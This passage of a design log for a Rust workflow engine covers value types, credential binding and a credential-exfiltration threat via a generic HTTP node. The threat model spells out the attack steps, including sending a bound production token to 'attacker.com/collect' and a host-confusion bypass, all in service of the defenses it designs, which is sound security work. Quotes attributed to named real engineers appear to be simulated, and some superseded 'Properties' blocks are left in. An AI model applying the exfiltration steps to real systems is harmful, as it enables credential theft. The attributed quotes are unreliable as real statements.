| DataFusion `ScalarValue` | Y | 32/64/128/256 | Y | full | Arrow |
| bson `Bson` | Y | Decimal128 | Y | Y | indexmap |
| VRL (Vector/Datadog) | Y | f64 | Y | Y | BTreeMap |
| CEL | Y | — | Y | Y | Map |
| simd-json/sonic-rs | mirror serde_json | — | — | — | (+escapes) |
| ciborium/rmpv | Y | — | Y | tag | Vec |
| Restate (durable) | N — bytes+codec | n/a | bytes | n/a | n/a |

**Every project handling richer-than-JSON data ships a custom value
enum.** Only pure JSON parsers mirror `serde_json::Value`, and even
they bolt on `RawNumber` (precision) + `BorrowedValue` (zero-copy).
This is decisive evidence for Option D, not preference.

### OQ-1…OQ-5 resolved on evidence + new Restate lesson

- OQ-1 → `rust_decimal` with explicit `(precision, scale)` in the
  value (DataFusion/Polars/bson unanimous).
- OQ-2 → `Arc<[Value]>` not `im::Vector` (CEL precedent; workflow
  data = immutable snapshots; drop heavy `im` dep).
- OQ-3 → **`Value::Redacted` REMOVED** (2026-05-15, user challenge).
  No variant, no sentinel. It predated Interlude II; once secret
  never enters `Value` (Interlude II), there is nothing to redact in
  the value model. Redaction = serializer+schema concern. Tony
  Arcieri withdrew his own proposal; matklad YAGNI; Niko rejected
  the Text-sentinel anti-pattern.
- OQ-4 → `Value: Eq+Hash+Ord`, `Float=NotNan<f64>` (VRL precedent;
  durable hashing needs total order). Arithmetic in expression.
- OQ-5 → reserve `#[non_exhaustive]` only; Arrow variant in B-02
  (DataFusion ScalarValue↔Arrow proves the path — Wes McKinney).
- **Q3 refined (Restate):** durable persistence = `(opaque bytes,
  codec_id)` decoupled from in-execution `Value`; enum evolves
  freely, storage stable. `Object`=`IndexMap` in memory (T13),
  sorted-key canonicalization for deterministic content hashing.

Notable quotes:
- **Wes McKinney**: «DataFusion `ScalarValue` is my Arrow argument
  already shipped — `ColumnarValue = Scalar | Array`. `#[non_exhaustive]`
  for a future Arrow variant is the industry-proven path, not a
  hypothesis.»
- **dtolnay**: «simd-json/sonic-rs keep serde_json's shape — but
  they only parse JSON, and even they added RawNumber and
  BorrowedValue. Not a counterexample — confirmation that nobody
  uses raw serde_json::Value for money/binary domain values.»
- **Maxim Fateev**: «Restate's opaque-bytes+codec durable model is
  the key lesson. Decouple in-execution Value (evolves freely) from
  persisted form (bytes + codec id, stable).»
- **Brian Goetz**: «Decimal with (precision, scale) in the value is
  unanimous — f64-money rejected by the entire surveyed industry.
  Red line closed by evidence.»

**Round V CLOSED (2026-05-15).** ТЗ finalized:
[`docs/superpowers/specs/2026-05-14-nebula-value-v2-design.md`](./superpowers/specs/2026-05-14-nebula-value-v2-design.md).
Option D ratified on primary-source evidence; all OQ resolved.
Implementation is a separate plan; this is design ratification only.

---

## Interlude I — Credential surface: field vs dependency

> Raised by user at the Round 1 → Round 2 boundary (2026-05-14):
> «в n8n есть тип поля credential. Я не хочу давать возможность
> пользователям добавлять это поле — мы через зависимости требуем,
> и система от этого системно добавляет данное поле в UI.»

### Finding: user position is already a ratified invariant

- `Field` enum has **no `Credential` variant** (verified in
  `crates/schema/src/field.rs:799`). Credential is **not** a schema
  field — it is a dependency declared via `#[require("key")] field:
  Handle<C>` (or explicit `#[credential(key="...")]`).
- The engine derives `MetadataSlot { key, kind: Credential, type_id,
  modifier, on_failure, label }` from the declaration; the editor
  reads `ActionMetadata.slots()` and **systemically renders the
  picker** in the separate **Bindings panel** — never in the schema
  form. (ADR-0064 two-panel rendering; Charter F17/F18.)
- Default visual mode is **hidden + Inspector** (ADR-0065); the
  two-panel modal is an opt-in alternative view. 80% of workflow
  authors never see infrastructure cognitive load.
- n8n collapsed credential into the schema property type and paid
  for it (boilerplate, runtime type-mismatch crashes, no
  discoverability). Jan Oberhauser conceded this Day 6 evening
  ("If I rebuilt n8n, I'd go your way").

So "users cannot add a credential field" is **structurally true
today**, not a proposal. No code change needed for the core
position.

### Edge cases reviewed

| Case | Resolution (existing design) |
|---|---|
| Credential depends on scheme (Slack = Bot Token \| OAuth2) | Two-tier: `Field::Mode` selects scheme → instance picker filtered by scheme (ADR-0064) |
| No registered credential of required type | Helpful disabled state with "add it" CTA, never an empty dropdown (Maxim Fateev pattern) |
| Optional credential | `Option<Handle<C>>` → `SlotModifier::Optional`, picker not required |
| Multiple credentials in one action | Multiple `#[require]` → multiple slots in Bindings panel (ADR-0044) |

### New decision: auto-bind when unambiguous

**Accepted.** When exactly one instance of the required credential
(or resource) type is registered in the deployment, the binding is
**automatic and the picker is not shown at all**. The picker appears
only when there is a genuine choice (2+ registered instances) or the
declaration is explicitly string-keyed (`#[require("specific_id")]`).

Rationale: aligns with ADR-0059 type-keyed form and Charter F20
("default hidden, opt-in visible"). Removes the most common n8n
complaint ("why do I pick when there is only one").

Builder precedents validating this:
- **n8n** (Jan Oberhauser): users beg for this for years.
- **Terraform** (Mitchell Hashimoto): "default provider" pattern,
  validated at scale.
- **NiFi** (Mark Payne): Controller Services auto-select-when-one,
  picker-when-many — 12 years validated.
- **Temporal** (Maxim Fateev): correct cognitive-load level —
  picker only on genuine choice.

### Notable quotes

- **Jan Oberhauser**: «Credential-as-property was n8n's main
  mistake. Your dependency-declared approach is correct. Auto-bind
  on single instance is what n8n users have begged for for years.»
- **dtolnay**: «Author writes `#[require] Handle<SlackCredential>`.
  Zero credential knowledge in schema. Engine infers everything.
  Auto-bind is just "when inference is unambiguous, don't ask".»
- **Mitchell Hashimoto**: «Terraform credentials live in the
  provider block, resources use them implicitly. Same shape.
  Auto-bind single instance = our default-provider pattern.»

### Credential-driven field visibility — two patterns distinguished

User asked whether field visibility should change based on
authorization (n8n behaviour). Panel separated two patterns n8n
conflates:

- **(A) Visibility depends on the selected auth *scheme*** (HTTP:
  OAuth2 vs API Key vs None changes which fields show; DB type
  changes connection fields; cloud provider changes region fields).
  **Needed — already solved.** Inside credential properties:
  `Field::Mode` selects scheme, each variant carries its own field
  set, two-tier rendering (ADR-0064). Inside Action Input / Resource
  Config: `Field::Mode` + `when` conditional visibility (= `Rule`,
  per Single Validation Language principle). Covers every real case
  the builders named.
- **(B) Action Input visibility depends on which *credential
  instance* is picked** in the Bindings panel. **NOT supported —
  deliberate anti-pattern.** Violates F17 (schema / bindings are
  orthogonal channels); unvalidatable and untestable (Jan
  Oberhauser, Tanner Linsley); not expressible in the transport
  contract (Henry Andrews). If a form genuinely must differ by
  credential, that is **two distinct Actions under two KEYs** (Colin
  McDonnell) — consistent with the Schema Immutability per
  KEY+Version principle.

**Boundary case:** "selected scheme changes available *values* in
Action input" (Slack Bot token → some channels, User token →
others). This is a **runtime concern** (what the API returns at
execution), resolved via `Field::Dynamic` (options resolved at
runtime through Loader) — NOT by hiding fields based on credential
choice.

### Builder consensus on visibility

- **Jan Oberhauser (n8n)**: pattern (A) is 90% of real requests;
  n8n's mistake was solving it via credential-as-property so Action
  fields and auth fields intermixed. Pattern (B) ("input fields
  depend on selected instance") — "a nightmare, never do it".
- **Colin McDonnell (Zod)** *(new)*: `z.discriminatedUnion` is
  exactly pattern (A), the most-used advanced Zod pattern; `Field::Mode`
  is the same. Pattern (B) is two schemas, not one — model as two
  KEYs.
- **Tanner Linsley (TanStack Form)** *(new)*: conditional fields by
  another field in the same form — fine; a form depending on an
  external picker — anti-pattern (two sources of truth, race on
  change).
- **Henry Andrews**: (A) = JSON Schema `oneOf` / `if-then-else`;
  (B) = cross-document dependency, not cleanly expressible — don't.
- **Mitchell Hashimoto / Mark Payne**: Terraform / NiFi both
  deliberately keep resource/processor fields independent of which
  credential/controller-service is selected. Validated by years.

### Charter / ADR impact

- **F17/F18 reinforced** — no `Field::Credential`; dependency-only
  surface confirmed as hard invariant. **Pattern (B)
  (instance-driven Action-input visibility) explicitly out of
  scope** — documented as anti-pattern, not a gap.
- **`Field::Mode` reaffirmed** as the single mechanism for
  scheme-driven visibility (pattern A) across credential properties,
  Action input, and Resource config.
- **ADR-0064 amendment** — add "auto-bind when unambiguous" section
  AND the (A)/(B) distinction with (B) declared out of scope.
- **ADR-0059 cross-reference** — type-keyed form is the mechanism
  behind auto-bind.

### Generic-node hard case — HttpRequest (raised by user)

User identified the sharpest tension: a **generic HttpRequest
Action** lets the workflow user pick the auth type at runtime
(None/Basic/Bearer/OAuth2/API Key/Custom). If auth becomes Action
input fields (n8n way) → the credential lifecycle is lost (rotation,
encryption/zeroize, audit, refresh/lease). If it is
`#[require] Handle<ConcreteCredential>` → the node cannot name a
concrete type.

**Resolution: NOT input fields. Polymorphic Credential via a
capability trait. Lifecycle fully preserved.**

```rust
#[derive(Action)]
struct HttpRequest {
    #[require("auth")]
    auth: Option<Handle<dyn HttpAuthScheme>>,  // capability, not concrete type
}
```

- `HttpAuthScheme` is a capability trait implemented by **real
  `Credential` types** in `nebula-credential-builtin`
  (`BasicAuthCredential`, `BearerCredential`, `ApiKeyCredential`,
  `OAuth2Credential`, `AwsSigV4`, third-party). Because each is a
  genuine `Credential`, the full lifecycle (rotation / zeroize /
  audit / lease / refresh) is preserved.
- Three layers (F18): deployment registers a concrete credential
  (secrets encrypted, zeroized, audited) → workflow binds the
  instance via picker filtered by `HttpAuthScheme` capability →
  HttpRequest declared the dependency. Scheme selection
  (Basic vs OAuth2 …) = which credential type is registered
  (Layer 3) or `Field::Mode` inside one credential — this is
  Interlude I pattern (A).
- Discovery mechanism already exists:
  `CredentialRegistry::iter_compatible(required: Capabilities)`.
  `HttpAuthScheme` is a capability; the picker filters by it.
- `nebula-credential-http` (ADR-0068, Sean McArthur) supplies
  `CredentialMiddleware<C: HttpAuthScheme>` that applies the scheme
  per request and triggers `Refreshable::refresh()` on 401.
- **Zero secret fields in Action input** — secret always lives in
  `Credential::State` (encrypted, zeroize), projected to `Scheme`
  only at request time via `SchemeGuard` (lifetime-pinned, `!Clone`).

Builder consensus:
- **Jan Oberhauser**: n8n's HttpRequest auth-as-node-fields was the
  mistake — tokens in workflow JSON, no rotation, leaks on export.
  `Handle<dyn HttpAuthScheme>` + real credentials is the correct
  redo.
- **Tony Arcieri**: secret never enters `Self::Input`; trait-object
  preserves §12.5 invariant.
- **Carl Lerche**: `Handle<dyn HttpAuthScheme>` dyn-safety via the
  existing `ProviderFuture<'a>` newtype pattern (ADR-0051).
- **withoutboats**: HTTP auth is an open set → trait object, not a
  closed `Field::Mode` enum; third parties add schemes without
  editing a built-in type.
- **Maxim Fateev**: long-running workflow + mid-execution rotation
  → only a real `Credential` + `Refreshable` + `SchemeFactory`
  survives; node-fields freeze the token and 401 hours later.
- **dtolnay**: `Option<Handle<dyn HttpAuthScheme>>`; `None` = no
  binding = unauthenticated. No "auth: None" schema variant needed.

**Charter / ADR impact:**
- Reinforces F17/F18 and the Interlude I invariant — generic nodes
  are NOT an exception; they use capability-typed dependencies.
- Hard requirement for **ADR-0068** (`nebula-credential-http`):
  `HttpAuthScheme` capability trait + `CredentialMiddleware` is the
  designated generic-HTTP-node mechanism. Promotes ADR-0068 from
  Round 2 draft to a load-bearing v1.0 item.
- Central theme for Round 2 — opened early by the user.

**Action items:**
- **DI1-6** — ADR-0068 scope: `HttpAuthScheme: AuthScheme`
  capability trait, dyn-safe via `ProviderFuture` pattern, built-in
  impls (Basic/Bearer/ApiKey/OAuth2), `CredentialMiddleware<C>`,
  401→refresh→retry-once.
- **DI1-7** — `nebula-credential` `iter_compatible` documented as
  the generic-node credential discovery surface; `HttpAuthScheme`
  registered as a capability.
- **DI1-8** — canonical example `crates/.../examples/` generic
  HttpRequest action consuming `Option<Handle<dyn HttpAuthScheme>>`
  with three registered schemes, proving zero secrets in Input and
  rotation survival mid-execution.

### Action items

- **DI1-1** — ADR-0064 amendment: auto-bind-when-unambiguous section
  + picker-suppression rule + interaction with string-keyed
  `#[require]`.
- **DI1-2** — `MetadataSlot` gains `auto_bound: bool` (engine sets
  true when single-instance resolution applied) so editor knows to
  hide the picker row.
- **DI1-3** — UX spec note: when auto-bound, Inspector still lists
  the binding (audit/discoverability) with an "auto" badge; only the
  modal picker row is suppressed.
- **DI1-4** — ADR-0064 amendment: document the (A)/(B) visibility
  distinction; pattern (A) → `Field::Mode` + `when`; pattern (B)
  explicitly out of scope as anti-pattern with rationale (F17,
  testability, transport, two-KEY alternative).
- **DI1-5** — `crates/schema/docs/` note: scheme-driven visibility
  recipes (the `Field::Mode` two-tier pattern) as the canonical
  answer to "form changes with auth type"; cross-link from
  NEWTYPE-PATTERNS.md.

---

## Interlude II — Credential exfiltration via generic HTTP node (CRITICAL SECURITY)

> Raised by user immediately after Interlude I (2026-05-14): «так
> можно получить уязвимость путём установки левого зарегистрированного
> Credential и привязать отправку его через свой HTTPAction на
> подготовленный адрес — и к нам придёт ключ».

### The vulnerability (real, known class)

Confused-deputy + SSRF credential exfiltration:

1. Attacker can create workflows (or compromised an account that can)
2. Creates a workflow with generic `HttpRequest`
3. Binds **someone else's production credential** (`SlackOAuth2`,
   `AwsSigV4`, prod API key) to the `auth` slot
4. Sets URL = `https://attacker.com/collect`
5. `CredentialMiddleware` dutifully adds `Authorization: Bearer
   <prod-secret>` and sends it to the attacker
6. Secret is exfiltrated.

Interlude I's `Handle<dyn HttpAuthScheme>` design protected the
secret **at rest and in transit inside the system** but did NOT
prevent a legitimate-looking application of the secret to a
malicious destination. n8n / Zapier / Make are all vulnerable to
this class. The user is correct — it is a hole.

### Resolution: audience binding (structural, not discipline)

A `Credential` carries not only the secret but **where it may be
applied**. The engine physically will not attach the secret to a
request whose destination is outside the credential's allowlist.

```rust
impl Credential for SlackOAuth2 {
    fn allowed_destinations() -> &'static [HostPattern] {
        &["slack.com", "*.slack.com"]   // baked into the built-in type
    }
}
```

`CredentialMiddleware` checks **before** building the `Authorization`
header and **before** projecting `State → Scheme`:

```
final_destination_host (after DNS + redirects) ∈ allowed_destinations ?
  yes → SchemeGuard acquired, scheme applied, request sent
  no  → CredentialError::DestinationNotAllowed,
        secret never projected, request never sent,
        audit event (attempted exfiltration), optional quarantine
```

- **Built-in credentials**: domain baked into the type; attacker
  cannot change it.
- **Generic credentials** (`ApiKeyCredential`, `BearerCredential`):
  `allowed_hosts` is a **mandatory part of the type**, set at Layer-3
  registration. **Deny-by-default**: no allowlist → credential cannot
  be registered (registration error). No "universal bearer for any
  URL" can exist.

This is the **audience-binding** pattern (OAuth2 `aud`, JWT
audience, AWS SigV4 service/region, SPIFFE SVID trust domain, mTLS
hostname). Related to Tony Arcieri's C-2 (AAD) but for egress, not
at-rest.

### Defense in depth

| Layer | Defense | Where |
|---|---|---|
| 1. Audience binding (primary, structural) | secret not applied to destination outside credential allowlist | `CredentialMiddleware`, deny-by-default |
| 2. RBAC on binding | who may bind a prod credential to a slot is policy, not any author | deployment policy |
| 3. Egress allowlist | HttpAction may only reach whitelisted hosts | deployment config |
| 4. Audit every application | `CredentialEvent { credential_id, destination_host, outcome }` | event bus |
| 5. Late secret projection | secret → `Scheme` only at request time via `SchemeGuard` | already in §15.7 |

### Security panel

- **Tony Arcieri**: confused deputy; audience binding,
  deny-by-default. Hardening: generic bearer without `allowed_hosts`
  must be a **registration error**, never silent-allow. §12.5
  extended to egress.
- **Filippo Valsorda**: allowlist must match the **final** host
  after DNS resolution and redirects, per hop. `slack.com@attacker.com`,
  open redirects, redirect-to-attacker — re-check allowlist on every
  hop or forbid credentialed redirects. Otherwise bypassed in
  minutes.
- **Diogo Mónica**: tie to `Quarantine` policy — N exfiltration
  attempts → auto-quarantine + alert; doubles as compromise
  detector.
- **Joe Beda (SPIFFE/SPIRE)** *(new)*: this is exactly SPIFFE
  workload-identity + audience. Make audience a **mandatory part of
  the Credential type**, not optional metadata. "Optional security =
  no security." A type that cannot be constructed without an
  audience is the only thing that holds in prod.
- **Sam Scott (Oso)** *(new)*: this is authorization, not
  authentication. Audience-on-credential is the correct v1.0
  minimum; policy baked into the credential, not a separate policy
  engine. Simple wins.
- **Sean McArthur**: `CredentialMiddleware` is the right enforcement
  point — check **before** header construction; `SchemeGuard`
  acquired only after host-check passes. Fail-closed.

### CORRECTION (user, 2026-05-14): middleware host-check is
### discipline-defense, not real defense

User objected: «надо чтобы разработчик узла проверил хост перед
тем как слать через reqwest — а если у него другая библиотека и он
не проверяет? Это мнимая защита, вообще не защита.»

**The user is right; the first resolution was wrong.** A host-check
inside `CredentialMiddleware` is opt-in: a node author using a
different HTTP library (`hyper`, `ureq`, raw socket) and not calling
the middleware bypasses it entirely. Any defense shaped as "the node
must call the checking function" is security theater. This violates
the project's own `feedback_type_enforce_not_discipline` principle.

**Root cause re-diagnosed:** the problem is NOT "node can skip the
host-check". It is "the node receives the **plaintext secret** and
can then do anything with it, in any library, to any destination".
Once the node holds `&str` of the token, the game is lost.

### Correct structural resolution: node never receives the plaintext secret

`Handle` / `SchemeGuard` **does not expose the secret**. No
`.as_str()`, no `Deref<Target=str>`, no `AsRef<str>`, no
`into_inner()`; `Debug`/`Display` redacted. The only operation
available to the node is an **engine-mediated** send/sign:

```rust
// Node CANNOT:
let t = handle.as_str();      // no such method
let r = handle.into_inner();  // no
format!("{handle}");          // redacted

// Node can ONLY (engine-owned path):
let resp = ctx.http()                 // engine-owned client, not node's reqwest
    .request(Method::POST, url)
    .json(&body)
    .send_with(handle)                // engine: host-check → project State→Scheme
    .await?;                          //         → sign → send. Inside the engine.
```

Consequences:

- Node uses its own library and does **not** go through `ctx.http()`
  → it simply has **no secret** → request goes out unauthenticated
  → external API returns 401. **No exfiltration — nothing to
  exfiltrate.**
- Node goes through `ctx.http()` → destination checked by the engine
  **before** `State→Scheme` projection.
- Worst case of a bypass attempt = a failing (401) request, **not a
  leaked secret**.

This is **safe-by-construction**: security does not depend on the
node "correctly checking the host". It follows from the secret being
**unreachable to the node in plaintext at all**, and the only way to
apply it being engine-owned with the destination check built in. The
"different library / didn't check" hole is closed by the type, not
by discipline.

### Defense in depth — Tier 3 untrusted

For untrusted plugins (Charter §8 Tier 3 ProcessSandbox): network
namespace + seccomp so the node process has **no egress route**
except the engine gateway. Even a memory-disclosure of secret bytes
cannot be exfiltrated — the namespace has no socket to
`attacker.com` except through the gateway, which re-checks
destination. Two independent structural barriers.

### Security panel (correction round)

- **Pat Hickey (Bytecode Alliance / Wasmtime)** *(central)*: this is
  capability-based security vs ambient authority. The node holds an
  unforgeable **capability** whose only operation is mediated by the
  issuer (engine). WASI model: no ambient sockets, only passed
  capabilities. Middleware host-check is ambient authority — always
  bypassable.
- **Tony Arcieri**: `Scheme` must not impl `Deref<str>` /
  `AsRef<str>` / `Display`. Only `sign(&self, req, dest)` called by
  the engine. §15.5 hardened: sensitive scheme physically does not
  expose material.
- **Filippo Valsorda**: mediated egress is the only thing that
  works; "verify before send" in node code is theater. Engine client
  re-checks destination on every redirect hop.
- **Joe Beda (SPIFFE/SPIRE)**: workload never sees raw secret; sees
  a handle, infra does the exchange. Node = workload, engine = SPIRE
  agent. Secret never crosses the workload boundary.
- **withoutboats**: `SchemeGuard` is `!Deref`, `!AsRef<str>`,
  `!Into<String>`. No compiler-reachable path from `Handle` to
  `String`. Closed by absence of API, not by lint.
- **Sean McArthur**: `nebula-credential-http` is therefore NOT
  optional middleware — engine **owns** the HTTP client; node gets a
  request-builder + `Handle`, hands them to the engine. No node-side
  reqwest for authenticated calls.
- **Carl Lerche**: `ctx.http()` = engine-owned `reqwest::Client`
  behind a facade covering streaming/bytes/timeouts; 99% of nodes
  see no difference. Exotic transports → extend facade or Tier-3
  gateway, not a design hole.

### RE-CORRECTION (user, 2026-05-14): "engine owns the client" breaks the core goal

User objected: «я как раз разрешаю клиентам ставить в плагин
различные библиотеки — не только http; так же к ресурсам левые
библиотеки». Charter headline ("any crate from crates.io works in
your action") is THE differentiator vs WASM. "Engine owns the HTTP
client / node never sees the secret" **kills it**: you cannot pass a
password into `sqlx::PgPool::connect()` or AWS creds into
`aws-sdk-s3` if the node never holds the secret. The corrected model
was right for ONE narrow case (HTTP-mediated), wrong as a universal
rule. The assistant should have caught this; the user did.

### Re-diagnosis: two distinct threat models were conflated

| | Threat (1): untrusted **workflow author** | Threat (2): untrusted **code author** |
|---|---|---|
| Who | Configurator. Does **not** write code. Binds credential + sets URL in UI/YAML | Writes Rust in a plugin, uses arbitrary libraries |
| Attack | bind someone's credential + redirect to attacker **via configuration** | in code, take the secret, send it anywhere with any library |
| Can the secret be hidden from them | **Yes** — they write no code; secret unreachable via config | **No** — code needs the secret to call `sqlx`/`aws-sdk` |
| Correct defense | audience binding + resource↔credential destination match | **Charter §8 isolation tiers**, NOT secret-hiding |

Interlude II's first resolution addressed threat (1). The
"correction" wrongly generalized "secret unreachable to node" to
threat (2), breaking "any library". Hiding the secret from **code
that needs it for a library** is impossible and unnecessary;
malicious code is contained by **isolation** (sandbox), not by
hiding the secret.

### Correct architecture: `nebula-resource` is where credential meets the library

Role separation (this is the answer to "arbitrary libraries for
resources"):

```rust
// RESOURCE author: credential meets the library here. Secret reachable to THIS code.
impl Resource for PostgresPool {
    async fn create(&self, ctx: &ResourceContext) -> Result<sqlx::PgPool, Error> {
        let cred = &self.db_auth;                  // Handle<DbCredential> — secret needed here
        let pool = sqlx::PgPool::connect(&cred.connection_string()).await?;  // ARBITRARY lib
        Ok(pool)
    }
}
// ACTION author: gets the ready pool. Credential NOT visible.
#[require("db")] db: Handle<PostgresPool>          // ready sqlx::PgPool, not the secret
```

- **Resource** = the boundary where the secret is applied to any
  library (`sqlx`/`aws-sdk`/`tonic`/`redis`/arbitrary). Resource
  author has secret access — necessary and normal.
- **Action** gets `Handle<Resource>` (a ready client), not the
  credential. Secret does not spread into business logic — bounded
  by type, not discipline (withoutboats).
- **Generic HTTP** is now a **special case of Resource**
  (`HttpClient` resource), not "engine owns everything". Node may
  use its own `reqwest` for unauthenticated calls — no secret there.

### Where defense actually holds

**Threat (1) — untrusted workflow author** (the user's original
scenario, primary): does not write `Resource::create`; binds
registered instances. Defense: **audience binding on credential** +
**resource declares its destination** (host in `ResourceConfig`);
engine verifies `resource.destination ∈
credential.allowed_destinations` at resolution, **before**
`create()`. Cannot bind `SlackOAuth2` to an `HttpClient` resource
aimed at `attacker.com` — audience mismatch blocked at resolution.
He writes no code, so cannot `reqwest::get(attacker, secret)` at
all.

**Threat (2) — untrusted code author**: hiding the secret is moot
(code uses the library). Defense = Charter §8 tiers. Tier 1
(in-process trusted): vetted team, `forbid(unsafe)`, audited —
trust the code; audience binding still defense-in-depth. Tier 3
(ProcessSandbox): network namespace + seccomp — code holds the
secret but **cannot open a socket to attacker.com**; no route
except the engine gateway, which re-checks destination. Secret is
useless without egress.

### New Charter-level security invariant (re-corrected — final)

> **Secret reaches Resource code, never Action code; the configurator
> never reaches the secret at all.** A `Credential`'s material is
> available inside `Resource::create` (necessary — the resource
> applies it to an arbitrary library: `sqlx`, `aws-sdk`, `tonic`,
> any crate). The resulting `Self::Runtime` (ready client/pool) is
> what `Action` receives via `Handle<Resource>` — the credential is
> baked in and no longer extractable from Action code (type
> boundary, not discipline). `Credential` declares
> `allowed_destinations` as a mandatory part of the type
> (deny-by-default for generic credentials); the engine enforces
> `resource.destination ∈ credential.allowed_destinations` at
> credential→resource resolution. Untrusted **workflow authors**
> (configurators) cannot reach the secret — they write no code, and
> audience binding blocks misdirected binding. Untrusted **code
> authors** are contained by Charter §8 isolation tiers (Tier 1
> trust+audit; Tier 3 network-namespace egress gateway), NOT by
> hiding the secret from code that legitimately needs it for a
> library.

Properties:
- **Preserves "any crate from crates.io"** — the load-bearing
  differentiator. Resource code uses arbitrary libraries with the
  secret.
- **Role-separated by type** (withoutboats) — Action has no
  compiler-reachable path to the credential; secret bounded to
  `Resource::create`.
- **Two threat models, two defenses** (Bryan Cantrill) — config-time
  audience binding for the configurator; isolation tiers for code.
  Not one defense forced onto both.
- **Capability shifts to egress** (Pat Hickey) — Tier 3: code holds
  the secret, but the network-call capability is engine-granted;
  secret without egress is inert.
- Touches: `nebula-resource` (the credential↔library boundary —
  core of Round 3), `Credential::allowed_destinations()` (ADR-0070,
  enforced at credential→resource resolution), Charter §8 tiers,
  `nebula-credential-http` reframed as one `HttpClient` Resource,
  not a universal chokepoint (ADR-0068).

Properties:
- **Capability-based, not ambient** (Pat Hickey) — `Handle` is an
  unforgeable capability; secret never materializes in node address
  space.
- **Closed by absence of API, not by lint/discipline** (withoutboats)
  — no compiler-reachable `Handle → String` path.
- **Bypass = no auth, not leak** — structural failure mode is safe.
- **Observability as DoD** — typed `CredentialError::DestinationNotAllowed`
  + audit + registration-time mandatory-audience check.
- Touches: `Scheme`/`SchemeGuard` (no secret exposure),
  `nebula-credential-http`/`ctx.http()` (engine owns client — ADR-0068
  rewritten from "middleware" to "mandatory mediated egress"),
  `Credential::allowed_destinations()` mandatory (ADR-0070), Tier-3
  network namespace.

Properties:
- **Structural, not discipline** — a credential type that cannot be
  constructed/registered without an audience (Joe Beda).
- **Observability as DoD** — typed `CredentialError::DestinationNotAllowed`
  + trace span + audit event + registration-time invariant.
- Touches `Credential` trait (`allowed_destinations()` mandatory),
  `CredentialMetadata`, `CredentialMiddleware` (ADR-0068),
  registration-time check.

### Clarification (user, 2026-05-14): is Resource always mandatory for auth?

User asked: «то есть мы всегда обязуем использовать ресурс если
нужна авторизация — для HttpRequest Action + HttpResource из ядра?»

**Answer: yes, authentication always goes through a Resource — but
common resources are built-in (shipped by core), the author writes
none of it. Boilerplate ≈ zero.**

```rust
#[derive(Action)]
struct HttpRequest {
    #[require("http")]
    http: Handle<HttpClient>,   // HttpClient — built-in core Resource, author writes nothing
}
// execute: self.http.request(...).send().await?  — secret never visible,
//          audience enforced INSIDE the core resource (trusted code)
```

| Case | Author uses | Resource? |
|---|---|---|
| Authenticated HTTP | `Handle<HttpClient>` (built-in) | yes, built-in, 0 boilerplate |
| Authenticated SQL / gRPC / Redis / Kafka / S3 | built-in resources (sqlx / tonic / redis / rdkafka / aws-sdk) | yes, built-in |
| Exotic library with auth | author writes their **own** Resource (any crate) | yes, custom — trust boundary, Tier model |
| Unauthenticated request | own `reqwest`/any library directly | **no** — no secret, no resource needed |

Rationale: applying the secret in Action code would break the type
boundary (secret spreads into business logic) and lose the single
audience-enforcement point. Resource is the **only** place secret
meets a library — either built-in-trusted (core enforces audience)
or custom under the Tier model. This is what makes the Interlude II
defense structural, not disciplinary.

Implication: a **`nebula-resource-builtin`** crate (sibling to
`nebula-credential-builtin`) ships `HttpClient`, `PgPool`,
`GrpcChannel`, `RedisClient`, etc. — core-trusted resources that
bake credential → library client and enforce audience internally.
Backlog seed **K-R1**. Confirms R-2/R-3 (Carl Lerche: deadpool/bb8
under the pool, arc-swap for resident clients).

Builder consensus: invariant correct; built-in resources remove
boilerplate; "any crate" goal preserved via custom resources
(Carl Lerche, Jan Oberhauser, Mitchell Hashimoto, dtolnay, Bryan
Cantrill).

### Clarification (user, 2026-05-14): generic core HttpRequest — "левые допуски"?

User: «а если это не Slack Action а core HttpRequest? Как мы
защищены от передачи левых допусков?»

For generic core `HttpRequest` there are **two distinct threats**;
Interlude II fully covered only one (exfiltration). The second
("левый доступ" — unauthorized use of a credential on a *legitimate*
destination) was a one-line mention — a gap. Re-diagnosed:

| | Threat A: Exfiltration | Threat B: Unauthorized use ("левый доступ") |
|---|---|---|
| Attack | bind credential + URL = `attacker.com` | bind a credential one is **not authorized for**, on the **correct** URL |
| Example | `StripeKey` + `attacker.com` → key leaks | junior binds prod `StripeKey`, URL = `api.stripe.com/v1/refunds` → unauthorized refunds |
| Caught by audience binding? | **Yes** (`attacker.com ∉ stripe.com`) | **No** — destination is legitimate |
| Needs | audience binding | **binding scope / RBAC** |

**Threat A** — already closed: generic `HttpRequest` uses built-in
trusted `HttpClient`, which enforces `input.url.host ∈
credential.allowed_destinations` inside core code.

**Threat B** — gap now closed: **Credential binding scope (RBAC).**
Credential declares at registration (Layer 3) who may bind it:

```rust
registry.register(stripe_key, RegisterOptions {
    allowed_destinations: ["api.stripe.com"],       // Threat A (audience)
    bindable_scope: BindScope::Roles(["finance"]),  // Threat B (RBAC) — NEW
});
```

- Picker (Layer 2) shows the workflow author **only** credentials in
  scope; out-of-scope credential is **not visible** in the dropdown.
- Engine rejects out-of-scope binding at **binding-time** (not
  runtime), even if instance_id is hand-injected into YAML.
- **Deny-by-default**: no explicit `bindable_scope` → namespace-local,
  not globally bindable. Sensitive credential without scope →
  `RegisterError::MissingBindScope` (fatal, paired with
  `MissingAudience`).

Structural, not discipline (picker hides + engine rejects at
binding-time). Orthogonal to audience binding: audience = *where it
may be sent*; bind scope = *who may use it*. Both mandatory, both
deny-by-default.

Full generic-HttpRequest protection:

| Threat | Defense | Enforced | Level |
|---|---|---|---|
| A. Exfiltration (evil URL) | audience binding | built-in `HttpClient` (trusted core) | code |
| B. Unauthorized use (legit URL, wrong credential) | binding scope/RBAC, picker filter, binding-time reject, deny-by-default | engine binding-time | deployment policy |
| C. Untrusted code author exfiltrates | Tier model (Tier 1 audit / Tier 3 sandbox+netns) | isolation | Charter §8 |

Three independent barriers; generic HttpRequest is covered by all
three simultaneously.

Builder consensus (Sam Scott, Tony Arcieri, Diogo Mónica, Bryan
Cantrill, Mitchell Hashimoto, Joe Beda): audience binding (A) and
binding scope (B) are **orthogonal and both mandatory**, both
deny-by-default, both structural. Terraform Cloud
workspace-credential scoping and Anchorage per-credential binding
ACL cited as validated precedents.

**New Charter-level invariant (paired with audience binding):**

> **Credential carries its binding scope.** Every `Credential`
> declares `bindable_scope` (roles / namespace / workflow allowlist)
> as a mandatory part of registration. Picker shows a workflow
> author only in-scope credentials; engine rejects out-of-scope
> binding at binding-time. Deny-by-default: no explicit scope →
> namespace-local, not globally bindable. Sensitive credential
> without scope → `RegisterError::MissingBindScope` (fatal).
> Orthogonal to audience binding (where it may be sent) — this is
> who may use it.

**Action items:**
